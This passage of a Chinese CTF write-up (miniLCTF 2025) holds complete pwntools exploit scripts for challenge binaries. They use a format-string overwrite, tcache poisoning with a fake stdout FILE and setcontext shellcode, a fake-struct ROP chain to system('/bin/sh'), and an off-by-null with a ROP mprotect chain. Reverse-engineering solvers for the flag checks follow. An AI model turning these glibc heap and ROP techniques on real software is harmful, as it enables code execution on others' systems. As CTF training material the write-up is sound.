print hex(pie)

#p="%10$p"

write=0x04020+pie
back=0x0177E+pie

p=fmtstr_payload(10, {write:back})
#debug()
sla("contents:", p)

shell()
```

### EasyHeap

如果创造堆块在 idx=0，释放 idx=0，在 idx=1 拿回释放堆块，释放 idx=0 就能构造 uaf。

先填满 tcache 来构造 unsorted 来进行泄漏，之后打 tcache poison 写 stdout 结构题。最后利用 setcontext 来写 shellcode 再用 openat2 替换 open 来 orw

```python
from pwn import *

context(arch='amd64',os='linux')
#context.log_level="DEBUG"
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("./chal")
io=remote("127.0.0.1", 41133)
libc=ELF("./libc.so.6", checksec=False)

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
        gdb.attach(io, gdbscript=script)

def choice(idx):
        sla("Choice:", str(idx))

def add(idx, size, content="A"*8):
        choice(1)
        sla("Index:", str(idx))
        sla("Size:", str(size))
        sla("data:", content)

def free(idx):
        choice(4)
        sla("Index:", str(idx))

def show(idx):
        choice(3)
        sla("Index:", str(idx))

def edit(idx, content):
        choice(2)
        sla("Index:", str(idx))
        sla("data:", content)


for i in range(9):
        add(i, 0x400)

for i in range(8):
        free(i)

for i in range(8):
        add(0, 0x400)

for i in range(1, 7):
        free(i)
free(8)
free(7)
show(0)

ru("Data: ")
libc.address=u64(r(6).ljust(8, "\0"))-0x203b20
print hex(libc.address)

add(0, 0x200)
free(0)
add(1, 0x200)
free(0)
show(1)
ru("Data: ")
heap=u64(r(5).ljust(8, "\0"))<<12
heap-=0x3000
print hex(heap)

add(0, 0x100)
add(1, 0x100)
free(1)
free(0)
add(2, 0x100)
add(3, 0x100)
free(1)
free(0)

rdi=libc.address+0x010f75b
#rsi=libc.address+0x00110a4d
binsh=libc.address+0x1cb42f
jmp=libc.address+0xb4b21

rop=p64(heap+0x3000)
#rop+=p64(rsi)+p64(0)
rop+=p64(libc.symbols['mprotect'])
rop+=p64(rdi)+p64(heap+0x3528)
rop+=p64(jmp)

sc=asm("""
    mov rax, 0x67616c66
    push rax
    xor rdi, rdi
    sub rdi, 100
    mov rsi, rsp
    push 0
    push 0
    push 0
    mov rdx, rsp
    mov r10, 0x18
    push SYS_openat2
    pop rax
    syscall
    mov rdi,rax
    mov rsi,rsp
    mov edx,0x100
    xor eax,eax
    syscall
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
""")


rop+=sc

target=(libc.sym["_IO_2_1_stdout_"])^(heap+0x3300)>>12

edit(2, p64(target))
fake_io = flat({
    0x0: b'  sh;',
    0x10: p64(libc.symbols['setcontext']+61),
    0x20: p64(libc.symbols['_IO_2_1_stdout_']+8),
    0x78: p64(0x2000),
    0x88: p64(libc.symbols['_environ']-0x10),  # _lock
    0x90: p64(7),
    0xa0: p64(libc.symbols['_IO_2_1_stdout_']),
    0xa8: p64(heap+0x3500),
    0xb0: p64(rdi),
    0xd8: p64(libc.symbols['_IO_wfile_jumps'] + 0x10),
    0xe0: p64(libc.symbols['_IO_2_1_stdout_']-8),
}, filler=b"\x00")

add(0, 0x100)

#debug("break *_IO_wdoallocbuf\nc")
#debug("break *_IO_switch_to_wget_mode\nc")

add(1, 0x400, rop)
add(0, 0x100, fake_io)

shell()
```

### CTFers

可以有一次机会更改 CTFer 指针，可以改到 name 这样就可以伪造 CTFer 结构题。最后先伪造泄漏之后利用 show 来任意代码执行。

```python
from pwn import *

context(arch='amd64',os='linux')
context.log_level="INFO"
context.terminal = ["tmux", "splitw", "-h"]
#io=process("./chal")
io=remote("127.0.0.1", 36311)
libc=ELF("./libs/libc.so.6")

r = lambda a : io.recv(a)
rl = lambda    a=False        : io.recvline(a)
ru = lambda a,b=True    : io.recvuntil(a,b)
s = lambda x            : io.send(x)
sl = lambda x            : io.sendline(x)
sa = lambda a,b            : io.sendafter(a,b)
sla = lambda a,b        : io.sendlineafter(a,b)
shell = lambda            : io.interactive()
def debug(script=""):
        gdb.attach(io, gdbscript=script)

IAT = 'Choice'

def add(name, point, type):
    sla(IAT, '0')
    sla('Name', name)
    sla('Point', str(point))
    sla('Type', str(type))


def dele(idx):
    sla(IAT, b'1')
    sla('Index', str(idx))


def edit(data):
    sla(IAT, str(0xDEADBEEF))
    sl(data)

def show():
    sla(IAT, '2')

payload = flat(
    {
        0x0: 0x409310,
        0x8: 0x72,
        0x10: 0x409040,
        0x18: 8,
        0x30: 0x402B9E,
    },
    filler='\x00',
) #fake user


add(payload, 114, 1)
edit(str(0x4092E0))

show()
ru('I am ')
libc.address = u64(ru('\x7f', False)[-6:].ljust(8, "\0")) - 0x21B780
print hex(libc.address)

rdi = libc.address+0x2a3e5
rsi = libc.address+0x02be51
ret = 0x40201a
print hex(rdi)

payload = flat(
    {
        0x0: 0x409310,
        0x8: 0x409300 - 0x18,
        0x10: 0x409300,
        0x18: 8,
        0x20: libc.address + 0x5A44E,
        0x30: libc.address + 0x15D030,
        0x38: rdi,
        0x40: 0,
        0x48: rsi,
        0x50: 0x409300,
        0x58: libc.sym["read"],
    },
    filler=b'\x00'
)


add(payload, 114, 1)

show()

payload = '\x00' * 0x40 + p64(libc.address + 0x1211AD) + '\x00' * 0x418 + flat([rdi, next(libc.search('/bin/sh')), libc.sym["system"]])
ru('[0] ')
s(payload)

shell()
```

### Minisnake

如果墙旁边有苹果可以吃苹果撞墙来进行溢出，利用 numeric 皮肤可以控制溢出数据。

用 AI 生成了一个种子寻找器

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>

#define WIDTH 16
#define HEIGHT 16
#define POINTS 10
#define MAX_LENGTH POINTS

enum skins { CLASSIC, NUMERIC };

struct Point {
    size_t x;
    size_t y;
    uint8_t value;
};

struct Snake {
    size_t length;
    struct Point body[MAX_LENGTH + 3];
    size_t point_count;
    struct Point points[POINTS];
};

struct {
    enum skins skin;
    unsigned int seed;
} config;

int point_compar_pos(const void *_pa, const void *_pb) {
    const struct Point *pa = _pa;
    const struct Point *pb = _pb;
    if (pa->x != pb->x) return pa->x - pb->x;
    return pa->y - pb->y;
}

void *search(const void *key, const void *base, size_t nmemb, size_t size,
             int (*compar)(const void *, const void *)) {
    const void *ptr;
    for (size_t i = 0; i < nmemb; ++i) {
        ptr = base + i * size;
        if (compar(ptr, key) == 0) {
            return (void *)ptr;
        }
    }
    return NULL;
}

void create(uint8_t map[HEIGHT][WIDTH], struct Snake *snake) {
    int x, y;
    for (int i = 0; i < POINTS; ++i) {
        do {
            x = random() % WIDTH;
            y = random() % HEIGHT;
        } while (search(&(struct Point){.x = x, .y = y}, snake->points, i,
                        sizeof(struct Point), point_compar_pos) ||
                 search(&(struct Point){.x = x, .y = y}, snake->body,
                        snake->length, sizeof(struct Point), point_compar_pos));

        snake->points[i] = (struct Point){
            .x = x, .y = y, .value = random() % (UINT8_MAX - 1) + 1};
        ++snake->point_count;
        map[y][x] = snake->points[i].value;
    }
}

void init_snake(struct Snake *snake, uint8_t map[HEIGHT][WIDTH]) {
    snake->length = 3;
    snake->point_count = 0;

    snake->body[0] = (struct Point){.x = 5, .y = 3};
    snake->body[1] = (struct Point){.x = 4, .y = 3};
    snake->body[2] = (struct Point){.x = 3, .y = 3};

    for (int i = 0; i < 3; ++i) {
        snake->body[i].value = random() % (UINT8_MAX - 1) + 1;
        map[snake->body[i].y][snake->body[i].x] = snake->body[i].value;
    }
}

bool print_snake_and_points(struct Snake *snake) {
    //printf("\nSnake Body:\n");
    //for (size_t i = 0; i < snake->length; ++i) {
        //printf("  [%zu] x=%zu y=%zu value=0x%02x\n",
        //       i, snake->body[i].x, snake->body[i].y, snake->body[i].value);
    //}
    if(snake->body[0].value == 0x16 && snake->body[1].value == 0x4d){
    //printf("\nPoints:\n");
    for (size_t i = 0; i < POINTS; ++i) {
        struct Point *p = &snake->points[i];
        if(p->y==15){ return true; }
        //printf("  [%zu] x=%zu y=%zu value=0x%02x\n", i, p->x, p->y, p->value);
    }
    }
    return false;
}

void print_map(uint8_t map[HEIGHT][WIDTH]) {
    printf("\nGame Map:\n");
    for (int y = 0; y < HEIGHT; ++y) {
        for (int x = 0; x < WIDTH; ++x) {
            printf("%02x ", map[y][x]);
        }
        printf("\n");
    }
}

int main(void) {
    //struct Snake snake;
    //uint8_t map[HEIGHT][WIDTH] = {0};

    //printf("Enter seed: ");
    //scanf("%u", &config.seed);

    int seed = 0;
    while(1){
        struct Snake snake;
    uint8_t map[HEIGHT][WIDTH] = {0};
    config.skin = NUMERIC;
    srandom(seed);

    init_snake(&snake, map);
    create(map, &snake);
    if(print_snake_and_points(&snake)){   print_map(map); break;}
    seed++;
    }
    printf("%d\n", seed);
     return 0;
}
```

如果蛇头和蛇身分别为 0x16 和 0x4d 再让一个苹果在 y=15 位置即可完成利用

```
Game Map:
00 4d 00 00 00 00 00 00 00 00 00 00 02 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 08 ae 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 d5 4d 16 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 b6 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 bc 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c3
4d 00 00 00 00 00 00 00 00 00 00 00 00 45 00 00
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
00 00 22 00 00 00 00 00 00 00 00 00 00 00 00 00
42194
```

当撞墙出去 y=17 时，立刻转右往 x 方向走。x=9 时摁 q 退出游戏，这样返回值会被控知道后门完成利用.

### mmapheap

off by null 修改下一 node 的 freelist

申请到 node 的数据区

在 ld 中找到栈地址，伪造 chunk，将其链入 freelist

ROP mprotect orw （远程没有 sh）

```python
#!/usr/bin/env python3
from pwncli import *

context.terminal = ["tmux", "splitw", "-h", "-l", "130"]
local_flag = sys.argv[1] if len(sys.argv) == 2 else 0

if local_flag == "remote":
    addr = '127.0.0.1:56459'
    ip, port = re.split(r'[\s:]+', addr)
    gift.io = remote(ip, port)
else:
    gift.io = process('./vuln')
gift.remote = local_flag in ("remote", "nodbg")
init_x64_context(gift.io, gift)
libc = load_libc('libmylib.so')
gift.elf = ELF('./vuln')

IAT = b'Choose an option:\n'


def add(idx, size, data):
    sla(IAT, b'1')
    sla(b'idx', str(idx))
    sla(b'size', str(size))
    sa(b'data', data)


def dele(idx):
    sla(IAT, b'3')
    sla(b'idx', str(idx))


def edit(idx, data):
    sla(IAT, b'2')
    sla(b'idx', str(idx))
    sa(b'data', data)


def show(idx):
    sla(IAT, b'4')
    sla(b'idx', str(idx))


cmd = '''
    brva 0x12F0
    brva 0x1422
    brva 0x14F8
    brva 0x15D9

    # brva 0x17AA libmylib.so
    # brva 0x19A1 libmylib.so

    set $heap = $rebase(0x4080)
    set $list = (&malloc - 0x1789) + 0x4020
    c
'''

add(0, 0x100, b'a')
add(1, 0xFE00, b'a')
add(2, 0x80, b'a')
add(15, 0x10, b'a')

add(3, 0x40, b'a')
add(4, 0xFF40, b'a')
add(5, 0x20, b'a')
dele(1)
edit(5, b'a' * 0x20)

edit(0, b'A' * 0xC0 + b'\x00' + b'A' * 7)
add(6, 0x100, b'a')
dele(2)
edit(0, b'A' * 0xC8)
dele(6)
show(0)
libc_base = u64_ex(ru(b'\x7f')[-6:]) + 0xB0
set_current_libc_base_and_log(libc_base)

edit(0, b'A' * 0xC0 + p64(0x100) + p64(libc_base - 0x10010))
edit(5, b'\x00' * 0x10 + p64(0x1010) + p64(0))
fake_node = flat(
    {
        0x0: libc_base + 0x6890,
        0x8: 0x114,
        0x10: libc_base - 0x10000,
        0x18: 0x7FFFFFFFFFFF,
        0x20: libc_base - 0x20000,
        0x28: libc_base - 0x20000,
    },
    filler=b'\x00',
)
add(7, 0xF0, b'a')
add(8, 0x1000, fake_node)
payload1 = b'\x00' * 0x70 + p32(0x110)
add(9, 0xFFF0, payload1)
fake_node = flat(
    {
        0x0: libc_base + 0x6910,
        0x8: 0x114,
        0x10: libc_base - 0x10000,
        0x18: 0x7FFFFFFFFFFF,
        0x20: libc_base - 0x20000,
        0x28: libc_base - 0x20000,
    },
    filler=b'\x00',
)
edit(8, fake_node)
add(10, 0x100, b'a')
show(8)
stack = u64_ex(ru(b'\x7f')[-6:])
leak_ex2(stack)

fake_node = flat(
    {
        0x0: stack - 0x128,
        0x8: 0x114,
        0x10: libc_base - 0x10000,
        0x18: 0x7FFFFFFFFFFF,
        0x20: libc_base - 0x20000,
        0x28: libc_base - 0x20000,
        0x30: b'/bin/sh\x00',
    },
    filler=b'\x00',
)
edit(8, fake_node)

ld_base = libc_base + 0x7000
CG.set_find_area(False, True)
ret = CG.ret()
rsi_rbp = libc_base + 0x113F
rax = ld_base + 0x1548B
rdi_rbp = ld_base + 0x25AC
rdx_leave_ret = ld_base + 0x1F5FB
syscall = ld_base + 0x16629

payload2 = (
    flat(
        [
            rax,
            10,
            rdi_rbp,
            stack & 0xFFFFFFFFFFFFF000,
            0,
            rsi_rbp,
            0x10000,
            stack + 0x130,
            rdx_leave_ret,
            7,
            syscall,
            stack + 0x148,
        ]
    )
    + ShellcodeMall.amd64.cat_flag
)
launch_gdb(cmd)
leak_ex2(libc_base)
leak_ex2(ld_base)
leak_ex2(stack)
# pause()
add(11, 0xFFF0, p64(ret) * 0x40 + payload2)

ia()
```

## Reverse

### d1ffer3nce

核心加密在 main_sub_1145141919 函数中，rust 也就只能全程动调看了

总体加密流程是将输入数据后面补上四个 0x04 字节，然后进行一系列类 tea 的自定义加密，我们可以根据调试和伪代码还原出加密流程，然后逆向编写解密就行

```cpp
uint8_t input[] = {0x72, 0x9d, 0xae, 0xbe, 0xa2, 0xe3, 0x84, 0x5b, 0x31, 0x0f, 0x01, 0xf1, 0xb3, 0xe7, 0x03, 0xc2, 0x4c, 0x81, 0x0a, 0x9c, 0xa0, 0xed, 0x2c, 0x4d, 0x92, 0x52, 0xa2, 0x14, 0x88, 0x2d, 0x77, 0x21};
uint32_t *p32_input = (uint32_t *)input;
int input_len = 32;
uint64_t k1{};
uint32_t k2{};
int k3 = 0;
uint64_t count{};
uint32_t v21{};
uint8_t zero_tof[] = "0123456789abcdef";
uint32_t enc = p32_input[(input_len - 4) / 4];

// 动调得到的总轮次
k1 = 0x4D696E69 * 0x103;
for (int total_count = 0x103 - 1; total_count >= 0; total_count--)
{
    count = (input_len - 4) / 4;
    uint32_t k1_pre = k1 - 0x4D696E69;
    k2 = ((uint32_t)(k1_pre + 0x4D696E69) >> 2) & 3;

    int j = count + 1;

    enc = p32_input[j - 1 - 1];

    uint32_t p32_input_0 = p32_input[0];
    uint64_t idx = k2 ^ (j - 1) & 3;
    uint64_t Value = (k1 ^ p32_input_0) + (*((uint32_t *)&zero_tof + idx) ^ enc);
    enc = p32_input[j - 1] - (Value ^ (((16 * enc) ^ (p32_input_0 >> 3)) + ((enc >> 5) ^ (4 * p32_input_0))));
    p32_input[j - 1] = enc;

    for (int i = count - 1; i >= 0; i--)
    {
        --count;
        enc = p32_input[i - 1];

        if (i == 0)
            enc = p32_input[(input_len - 4) / 4];

        uint32_t b = p32_input[i + 1];

        uint32_t temp = ((k1 ^ b) + (*((uint32_t *)&zero_tof + (k2 ^ count & 3)) ^ enc));
        uint32_t temp2 = (((16 * enc) ^ (b >> 3)) + ((enc >> 5) ^ (4 * b)));
        enc = p32_input[i];

        uint32_t a = enc - (temp2 ^ temp);
        p32_input[i] = a;
    }
    k1 -= 0x4D696E69;
}
printf("%.32s", input);
//miniLCTF{W3lc0m3~MiN1Lc7F_2O25}
```

### **0.s1gn1n**

main 函数去掉一个永恒跳转的花指令，函数逻辑很简单，根据 check 函数的返回值来判断正误，check 的返回值必须为 1 才是正确的

![](/images/SD1abvXU1oMzm6xkNgWcuAY6nN0.png)

check 函数里面有两个函数看着跟二叉树好像有关系，我们直接定义个结构体还原一下

![](/images/SUxCbv3LuofBYOxc2Zgc6k63nkg.png)

![](/images/YWSnb4RWyoz4bGxjR6ocCrLxnUf.png)

![](/images/KbarbOJXsoiKUox65DTcpZKAnKc.png)

下面的函数就是 base64，以及前后自己异或 + 异或一个数组,最后计算这些值是不是符合算式最后的结果 v3==1

![](/images/RkB1buRI1oYy6Exkqj5cCIiWnUc.png)

那么我们可以用 z3 去解,那么这个二叉树遍历我们怎么解决呢，其实可以构造个相同长度的 flag 然后进行映射

```python
from z3 import *
import base64

class TreeNode:
    def __init__(self, value):
        self.value = value
        self.left = self.right = None

def tree_init(data):
    if not data:
        return None
    root = TreeNode(data[0])
    queue = [root]
    index = 1
    while index < len(data):
        node = queue.pop(0)
        if index < len(data) and data[index]:
            node.left = TreeNode(data[index])
            queue.append(node.left)
        index += 1
        if index < len(data) and data[index]:
            node.right = TreeNode(data[index])
            queue.append(node.right)
        index += 1
    return root

def inorder_traversal(node, output):
    if node:
        inorder_traversal(node.left, output)
        output.append(node.value)
        inorder_traversal(node.right, output)

def solve_flag(byte_data, length):
    s = Solver()
    v5 = [Int(f'v5_{i}') for i in range(length)]
    s.add(Sum([v5[i] - 1 for i in range(length)]) == 28)  # -28 + sum(v5 - 1) = 0

    for b in v5:
        s.add(b >= 0, b < 127)

    if s.check() != sat:
        raise ValueError("Z3 cannot find a solution.")

    model = s.model()
    v5_values = [model.evaluate(v5[i]).as_long() for i in range(length)]

    orig = [0] * length
    orig[0] = byte_data[0]
    for i in range(1, length):
        orig[i] = v5_values[i] ^ orig[i - 1] ^ byte_data[i]

    decoded = bytes(orig)
    try:
        return base64.b64decode(decoded)
    except Exception as e:
        raise ValueError(f"Base64 decode failed: {e}")

if __name__ == '__main__':
    xor_box = [
        0x58, 0x69, 0x7B, 0x06, 0x1E, 0x38, 0x2C, 0x20, 0x04, 0x0F, 0x01, 0x07,
        0x31, 0x6B, 0x08, 0x0E, 0x7A, 0x0A, 0x72, 0x72, 0x26, 0x37, 0x6F, 0x49,
        0x21, 0x16, 0x11, 0x2F, 0x1A, 0x0D, 0x3C, 0x1F, 0x2B, 0x32, 0x1A, 0x34,
        0x37, 0x7F, 0x03, 0x44, 0x16, 0x0E, 0x01, 0x28, 0x1E, 0x68, 0x64, 0x23,
        0x17, 0x09, 0x3D, 0x64, 0x6A, 0x69, 0x63, 0x18, 0x18, 0x0A, 0x15, 0x70
    ]
    test = "miniL{0123456789abcdefghijklMNopqrstuvwxyzA}"
    flag_bytes = solve_flag(xor_box, len(xor_box))
    tree_root = tree_init(test)
    table2 = []
    inorder_traversal(tree_root, table2)

    mapping = {table2[i]: flag_bytes[i] for i in range(len(flag_bytes))}
    print(''.join(chr(mapping[c]) for c in test))
    # miniLCTF{esrevER_gnir33nignE_Is_K1nd_0F_@rt}
```

### x96re

天堂之门单字节异或 +SM4 标准加密

![](/images/WVMGbI6UvopiFKxILTtcR76LnUg.png)

在 whathappened 函数里面我们可以看到它修改了段寄存器，之后会执行长跳转

![](/images/Q3q6bmcfpoVgMqxWdodcwtC0nif.png)

经过调试可知对每个字节进行了 xor 0x4C,这个题其实出题人还写了解密的函数,但是标准加密直接用 cyberchef 解了

![](/images/XSKHb0kczoxO9KxyHGqcYWMhnWe.png)

最后两个字节不用异或得到 flag 就是 **miniLCTF{3ac159d665b4ccfb25c0927c1a23edb3}**

![](/images/A7bwbCrfeolBd7xzJcncdPv5nSB.png)

![](/images/JBvxbl2w0ozqmIxFF10cy7NbnSe.png)

### rbf

Brainfuck 逆向

![](/images/UOKYbGr3So6t36xr3Fvc4wXNnXe.png)

经过 java 层的分析可知,首先检验 flag 的格式和长度,然后再调用 native 的 check 函数进行校验

![](/images/Wq2hbC6pzoJY8bx9lmlc3luWnnF.png)

native 层的 check 函数会检查 flag 的内容必须都是小写字母,然后才会调用 brainfuck 进行 flag 的检验

![](/images/Bh6Zbqdfwoa7ZmxILsVcYn26nXg.png)

直接下断点提取 brainfuck 的操作码,提取结果如下图:

![](/images/Ixl4bRZqTo82OUxghercBwhRnnJ.png)

接下来就是解析器的编写

```cpp
#include <iostream>
#include <windows.h>
#include <fstream>
#include <map>

int WriteToFile(const std::string &file_string, const std::string str)
{
    std::ofstream OsWrite(file_string, std::ofstream::trunc);
    OsWrite << str;
    OsWrite << std::endl;
    OsWrite.close();
    return 0;
}

void ProcessLoop(uint8_t *Code, int &i, int &p, std::string &Result, int &p_in, int len, int indentLevel = 0)
{
    std::string indent(indentLevel, '\t');

    char Buf[256]{};
    sprintf(Buf, "%swhile(d[p])\n%s{\n", indent.c_str(), indent.c_str());
    Result += Buf;

    int initial_p = p;
    i++;
    while (i < len && Code[i] != ']')
    {
        uint8_t CurrentCode = Code[i];
        switch (CurrentCode)
        {
        case '>':
        {
            // printf("++p;");
            int add{};
            while (Code[i] == '>')
            {
                ++add;
                i++;
            }
            i--;
            if (add != 0)
            {
                sprintf(Buf, "%s\tp += %d;\n", indent.c_str(), add);
                Result += Buf;
                // printf("++p;");
                p += add;
            }
            break;
        }
        case '<':
        {
            // printf("--p;");
            int sub{};
            while (Code[i] == '<')
            {
                ++sub;
                i++;
            }
            i--;
            if (sub != 0)
            {
                sprintf(Buf, "%s\tp -= %d;\n", indent.c_str(), sub);
                Result += Buf;
                // printf("++p;");
                p -= sub;
            }
            break;
        }
        case '+':
        {
            int add{};
            while (i < len && Code[i] == '+')
            {
                ++add;
                i++;
            }
            i--;
            if (add != 0)
            {
                // sprintf(Buf, "%s\td[p] += %d;\n", indent.c_str(), add);
                sprintf(Buf, "%s\td[p] += %d;\n", indent.c_str(), add);
                Result += Buf;
            }
            break;
        }
        case '-':
        {
            int sub{};
            while (i < len && Code[i] == '-')
            {
                ++sub;
                i++;
            }
            i--;
            if (sub != 0)
            {
                // sprintf(Buf, "%s\td[%d] -= %d;\n", indent.c_str(), p, sub);
                sprintf(Buf, "%s\td[p] -= %d;\n", indent.c_str(), sub);
                Result += Buf;
            }
            break;
        }
        case ',':
        {
            // sprintf(Buf, "%s\td[%d] = in[%d];\n", indent.c_str(), p, p_in);
            sprintf(Buf, "%s\td[p] = in[p_in];\n%s\t++p_in;\n", indent.c_str(), indent.c_str());
            Result += Buf;
            ++p_in;
            break;
        }
        case '[':
        {
            ProcessLoop(Code, i, p, Result, p_in, len, indentLevel + 1);
            break;
        }
        case '.':
        {
            // sprintf(Buf, "%s\tif(d[%d]==\'0\')\n%s\t\{\n%s%s\t\treturn 0;\n%s\t\}\n%s\tif(d[%d]==\'1\')\n%s\t\{\n%s%s\t\treturn 1;\n%s\t\}\n", indent.c_str(), p, indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str(), p, indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str());
            sprintf(Buf, "%s\tif(d[p]==\'0\')\n%s\t\{\n%s%s\t\tbreak;\n%s\t\}\n%s\tif(d[p]==\'1\')\n%s\t\{\n%s%s\t\tbreak;\n%s\t\}\n", indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str(), indent.c_str());
            Result += Buf;
            break;
        }
        default:
            break;
        }
        i++;
    }
    sprintf(Buf, "%s}\n", indent.c_str());
    Result += Buf;
}

int main()
{
    int index = 0;
    std::ifstream bfCodeFile("bf.txt");

    uint8_t *Code = new uint8_t[45000];
    if (!bfCodeFile.is_open())
    {
        delete[] Code;
        return 0;
    }

    bfCodeFile.seekg(0, std::ios::end);
    int len = bfCodeFile.tellg();
    bfCodeFile.seekg(0, std::ios::beg);
    bfCodeFile.read((char *)Code, len);

    std::string Result;

    int p = 0;
    int p_in = 0;
    char Buf[256]{};
    for (int i = 0; i < len; i++)
    {
        uint8_t CurrentCode = Code[i];
        switch (CurrentCode)
        {
        case '>':
        {
            int add{};
            while (Code[i] == '>')
            {
                ++add;
                i++;
            }
            i--;
            if (add != 0)
            {
                sprintf(Buf, "p += %d;\n", add);
                Result += Buf;
                // printf("++p;");
                p += add;
            }

            break;
        }
        case '<':
        {
            int sub{};
            while (Code[i] == '<')
            {
                ++sub;
                i++;
            }
            i--;
            if (sub != 0)
            {
                sprintf(Buf, "p -= %d;\n", sub);
                Result += Buf;
                // printf("++p;");
                p -= sub;
            }
            break;
        }
        case '+':
        {
            int add{};
            while (Code[i] == '+')
            {
                ++add;
                i++;
            }
            i--;
            if (add != 0)
            {
                // sprintf(Buf, "d[%d] += %d;\n", p, add);
                sprintf(Buf, "d[p] += %d;\n", add);
                Result += Buf;
            }
            break;
        }
        case '-':
        {
            int sub{};
            while (Code[i] == '-')
            {
                ++sub;
                i++;
            }
            i--;
            if (sub != 0)
            {
                // sprintf(Buf, "d[%d] -= %d;\n", p, sub);
                sprintf(Buf, "d[p] -= %d;\n", sub);
                Result += Buf;
            }
            break;
        }
        case ',':
        {
            // sprintf(Buf, "d[%d] = in[%d];\n", p, p_in);
            sprintf(Buf, "d[p] = in[p_in];\n++p_in;\n");
            Result += Buf;
            ++p_in;
            break;
        }
        case '[':
        {
            ProcessLoop(Code, i, p, Result, p_in, len);
            // 格式化注释
            Result += "//" + std::to_string(index++) + "\n";
            Result += "for(int count = 13;count<13+35;count++){printf(\"\%d,\",d[count]);}printf(\"\\n\");\n";
            break;
        }
        case '.':
        {
            // sprintf(Buf, "if(d[%d]==\'0\')\n\{\n\treturn 0;\n\}\nif(d[%d]==\'1\')\n\{\n\treturn 1;\n\}\n", p, p);
            sprintf(Buf, "if(d[p]==\'0\')\n\{\n\treturn 0;\n\}\nif(d[p]==\'1\')\n\{\n\treturn 1;\n\}\n");
            Result += Buf;
            break;
        }
        default:
            break;
        }
    }
    WriteToFile("C_Code.txt", Result);
END:
    bfCodeFile.close();
    delete[] Code;

    return 0;
}
```

其实大家也可以直接去网上找脚本然后自己改,这里我添加了一些东西,我们在遍历完循环之后有一个数据的输出，为啥从 13 开始因为经过调试发现从 13 开始正好就是我们输入的值-'a'，然后我又增加了行数注释，这样我们在调试我们生成的代码样本的时候可以全局搜索然后定位到具体的分析位置。

![](/images/Ck40bJJj4oD5d8xActTcnIlXnFc.png)

输出的 C_code 如下图:

![](/images/SGiRbygFPoOjBNxLfEZcHvJLnae.png)

然后我们直接运行这个程序，这里为啥选择 **xydefghijklm** 作为示例输入，稍后会给出答案，输出结果如下图:

![](/images/LRSVbwz1LodsSuxFU0gcuNCknth.png)

才 1719 行数据也不是很多,然后我们就可以注意到前 12 列，正好就是我们的示例输入-'a',这里为啥不用 a,b 这些，在多次测试下 00，01 很容易混淆，所以选择了 **xydefghijklm**。

![](/images/QwEvbQr7PodVd9xSlffc8Saaneb.png)

我们接着分析这些数据,前面那些行很显然是可以直接删去的

![](/images/Wlqbbx2fcooRCBxky1acO9ZJnLb.png)

然后我们一眼盯真，发现了类似下标值的东西,我们不确定继续往下面找，最终确定确实是下标值，那么我们是不是可以想成就是循环，然后每个循环之间还有一些 00，其实可以删掉。

![](/images/LUIvbXhizo46zbxA2zjcBRydnUc.png)

分离出每一个循环之后，我们发现每个循环的末尾都有一个值，比如下图这个就是 F7，这里很显然就是 cmp

![](/images/K0W5bPsaFoQXECxxn1jc4m39nRg.png)

那么我们看一下什么情况才是正确的情况，最后 d[p]的值必须为'1'

![](/images/URbubw8lPotmsQxHyTtc0Lq8nWd.png)

我们在输出的 C_code 里面发现后面是有两个 while 循环的，但这两个 while 循环又是固定的两种情况,一种是 +7,一种是 +8，因此必须让它走第一个 while 循环才行

```c
while (d[p])
{
        p += 1;
        d[p] -= 1;
        p += 1;
        while (d[p])
        {
                d[p] -= 1;
        }
        p += 1;
        while (d[p])
        {
                d[p] -= 1;
        }
        p -= 1;
        p += 1;
        d[p] += 7;
        while (d[p])
        {
                p -= 1;
                d[p] += 7;
                p += 1;
                d[p] -= 1;
        }
        p -= 1;
        if (d[p] == '0')
        {
                break;
        }
        if (d[p] == '1')
        {
                break;
        }
        p -= 2;
        while (d[p])
        {
                d[p] -= 1;
        }
}
//1717
for (int count = 13; count < 13 + 35; count++) { printf("%02X ", d[count]); }printf("\n");
p += 1;
while (d[p])
{
        p += 1;
        while (d[p])
        {
                d[p] -= 1;
        }
        p += 1;
        while (d[p])
        {
                d[p] -= 1;
        }
        p -= 1;
        p += 1;
        d[p] += 6;
        while (d[p])
        {
                p -= 1;
                d[p] += 8;
                p += 1;
                d[p] -= 1;
        }
        p -= 1;
        if (d[p] == '0')
        {
                break;
        }
        if (d[p] == '1')
        {
                break;
        }
        p -= 1;
        d[p] -= 1;
}
//1718
for (int count = 13; count < 13 + 35; count++) { printf("%02X ", d[count]); }printf("\n");
p -= 27;
```

回到我们之前分析的打印的数据那里这三列，第一列是我们自己经过加密后的数据,第二列是我们需要相等的数据(但是这个需要相等的数据不完全是打印出来的这个数字)，需要我们去验证一下，因为我们所框的第二排数据是我们的密文减去我们加密的数据，这个数字是正确的，因此我们只需要用下面的数字加上我们自己输入的加密数据就可以得出密文，然后如果每一组对比正确的话第三排的第一列就会返回 1。

![](/images/EAVTbcvd1orIYaxEy9rcdoQQn1g.png)

接下来我们就要分析每个循环里面的加密流程，他每个加密流程都是如下图这样，都是一个一个的方程组

